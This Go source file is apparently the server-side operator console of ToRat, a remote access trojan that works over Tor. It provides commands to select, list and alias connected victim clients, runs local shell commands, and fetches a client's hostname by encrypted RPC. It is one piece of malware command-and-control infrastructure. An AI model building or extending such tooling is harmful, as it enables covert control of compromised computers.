package server

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/lu4p/ToRat/models"
	"github.com/lu4p/ToRat/torat_server/crypto"
)

var void int

// Server side interactive shell menu
func Shell() {
	shell := ishell.New()
	cwd, err := os.Getwd()

	if err != nil {
		fmt.Println(green("[Server] ") + red("[!] ", err))
		panic(err)
	}
	shell.SetPrompt(green("[Server] ") + blue(cwd) + "$ ")

	// Select client
	shell.AddCmd(&ishell.Cmd{
		Name: "select",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				fmt.Println(green("[Server] ") + red("[!] No clients to select!"))
				return
			}
			choice := c.MultiChoice(listConn(), "Select client to interact with:")
			client := getClient(choice)
			client.shellClient()
		},
		Help: "interact with a client",
	})

	// List clients
	shell.AddCmd(&ishell.Cmd{
		Name: "list",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				fmt.Println(green("[Server] ") + red("[!] No clients connected yet!"))
				return
			}
			printClients()
		},
		Help: "list all connected clients",
	})

	// Set client alias
	shell.AddCmd(&ishell.Cmd{
		Name: "alias",
		Func: func(c *ishell.Context) {
			if len(activeClients) == 0 {
				fmt.Println(green("[Server] ") + red("[!] No clients connected yet!"))
				return
			}
			choice := c.MultiChoice(listConn(), "Select client to give an alias:")
			fmt.Println(green("Type an alias for selected client:"))
			name := c.ReadLine()
			client := activeClients[choice]

			// TODO: ISSUE #173
			client.Client.Name = name
			db.Save(&client.Client)

		},
		Help: "give a client an alias",
	})

	// Change directory
	shell.AddCmd(&ishell.Cmd{
		Name: "cd",
		Func: func(c *ishell.Context) {

			path := strings.Join(c.Args, " ")
			err := os.Chdir(path)

			if err != nil {
				fmt.Println(green("[Server] ") + red("[!] Cannot navigate to that path!"))
				fmt.Println(green("[Server] ") + red("[!] ", err))
			}
			cwd, _ := os.Getwd()
			shell.SetPrompt(green("[Server] ") + blue(cwd) + "$ ")

		},
		Help: "change the working directory of the server",
	})

	// Exit the server
	shell.AddCmd(&ishell.Cmd{
		Name: "exit",
		Func: func(c *ishell.Context) {
			fmt.Println(green("[Server] ") + red("Exiting Now!"))
			c.Stop()
		},
		Help: "exit the server",
	})

	shell.NotFound(runCommand)

	shell.Run()
}

// Server side shell command
func runCommand(c *ishell.Context) {
	var osshell string
	var osshellargs []string
	command := strings.Join(c.Args, " ")

	if runtime.GOOS == "linux" {
		osshell = "/bin/sh"
		osshellargs = []string{"-c", command}
	} else if runtime.GOOS == "windows" {
		osshell = "cmd"
		osshellargs = []string{"/C", command}
	} else if runtime.GOOS == "darwin" {
		osshell = "/bin/sh"
		osshellargs = []string{"-c", command}
	}

	execcmd := exec.Command(osshell, osshellargs...)
	cmdout, err := execcmd.Output()

	if err != nil {
		c.Println(green("[Server] ") + red("[!] Bad or unknown command!"))
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	} else if cmdout == nil {
		c.Println(green("[Server] ") + "No output returned by command!")
		return
	} else {
		c.Println(string(cmdout))
	}
}

// Get hostname of client
func (client *activeClient) GetHostname() error {
	var encHostname models.EncAsym

	err := client.RPC.Call("API.Hostname", void, &encHostname)
	if err != nil {
		return err
	}
	byteHostname, err := crypto.DecAsym(encHostname)
	if err != nil {
		return err
	}
	client.Hostname = string(byteHostname)
	return nil
}
